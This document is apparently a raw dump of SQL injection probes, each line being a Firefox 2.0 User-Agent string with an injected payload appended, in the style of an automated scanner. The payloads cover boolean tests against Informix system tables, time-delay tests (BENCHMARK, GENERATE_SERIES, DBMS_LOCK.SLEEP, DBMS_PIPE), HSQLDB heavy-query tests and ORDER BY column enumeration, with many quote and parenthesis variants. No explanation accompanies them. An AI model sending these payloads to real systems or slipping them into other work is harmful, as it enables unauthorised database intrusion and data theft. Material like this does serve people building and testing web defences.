Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT aFbf FROM DUAL WHERE 5844=5844 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS yjYE WHERE 8663=8663 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS eFkf WHERE 1184=1184 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS zUpn WHERE 3609=3609 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 6621=6621 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 1407=1407 OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR 6519=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- jZRs
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- rUvY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ('lnhr'='lnhr
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND ((('uPGD' LIKE 'uPGD
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND 'JzQG%'='JzQG
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND \x22kLek\x22=\x22kLek
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1) AND (\x22HbBz\x22 LIKE \x22HbBz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- bEfX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)# hisE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS PIJl WHERE 5274=5274 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- uAGz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS spWP WHERE 3753=3753 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- SSaU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 7390=7390 PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)-- xBQk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) PROCEDURE ANALYSE(EXTRACTVALUE(4337,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x45736c67))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS EXuk WHERE 8936=8936 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS Ozqb WHERE 9631=9631 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS EwmD WHERE 5101=5101 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS QGLy WHERE 9535=9535 PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) PROCEDURE ANALYSE(EXTRACTVALUE(3312,CONCAT(0x5c,(BENCHMARK(32000000,MD5(0x4e534e58))))),1)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (5393=5393
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ('lrTa'='lrTa
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (('WzJB'='WzJB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ((('UQGd'='UQGd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND 'IKOn'='IKOn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ((\x22Vete\x22=\x22Vete
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND ((\x22YCLM\x22 LIKE \x22YCLM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)))(SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (((\x22hjqZ\x22 LIKE \x22hjqZ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- FIiH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) OR 'mqGr'='VIct
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 3584=3584 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- TRLH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 8476=8476 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- LqXf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(79)||CHAR(78)||CHAR(101)||CHAR(113) FROM DUAL WHERE 6758=6758 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(72)||CHAR(80)||CHAR(119)||CHAR(120) FROM DUAL WHERE 7677=7677 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT ycvm WHERE 7654=7654 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS mXSC WHERE 9376=9376 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- ZtPU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS tuoL WHERE 5212=5212 (SELECT (CASE WHEN (3355=3355) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3355),0),3200000000),NULL) ELSE CHAR(103)||CHAR(120)||CHAR(105)||CHAR(83) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)-- nUhQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- zRlf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (((4861=4861
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ('FMQT'='FMQT
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (('JTlW'='JTlW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND 'dgim'='dgim
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ('UKPn' LIKE 'UKPn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (('TBia' LIKE 'TBia
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ((('wXPE' LIKE 'wXPE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND 'XVzV%'='XVzV
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND 'Ljje' LIKE 'Ljje
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND (\x22UqKo\x22=\x22UqKo
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ((\x22Yqms\x22=\x22Yqms
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND \x22KjID\x22=\x22KjID
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND ((\x22Pzjf\x22 LIKE \x22Pzjf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) AND \x22ROEA\x22 LIKE \x22ROEA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))) OR 'MszT'='wsqn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 5361=5361 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- TDQv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 2185=2185 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- cFwm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 5345=5345 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- tlEE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(118)||CHAR(113)||CHAR(89)||CHAR(84) WHERE 8330=8330 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(87)||CHAR(86)||CHAR(103)||CHAR(80) WHERE 5316=5316 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0))))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS qRFc WHERE 8712=8712 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- dbbc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS GRAF WHERE 8108=8108 (SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))-- sVcR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE)(SELECT (CASE WHEN (4060=4060) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) ELSE CHAR(104)||CHAR(67)||CHAR(104)||CHAR(122) END) FROM (VALUES(0)))#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (9711=9711) THEN (SELECT BENCHMARK(32000000,MD5(0x68537145))) ELSE 9711*(SELECT 9711 FROM mysql.db) END))-- SJwc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (9711=9711) THEN (SELECT BENCHMARK(32000000,MD5(0x68537145))) ELSE 9711*(SELECT 9711 FROM mysql.db) END))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (7364=7364) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,32000000)) ELSE 1/(SELECT 0) END))-- hRFL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (7364=7364) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,32000000)) ELSE 1/(SELECT 0) END))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(SELECT (CASE WHEN (8377=8377) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 8377*(SELECT 8377 UNION ALL SELECT 6816) END))-- IbZp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17',(BEGIN IF (3187=3187) THEN DBMS_LOCK.SLEEP(32); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)-- sXxH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(BEGIN IF (3187=3187) THEN DBMS_LOCK.SLEEP(32); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17,(SELECT (CASE WHEN (8072=8072) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(69)||CHR(73)||CHR(90)||CHR(78),32) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) ORDER BY 8411-- sEWC
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 1-- GOxz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 5722-- njjT
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 1-- JUXP
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) ORDER BY 1-- zokc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) ORDER BY 6577-- DhNv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) ORDER BY 1-- DiOh
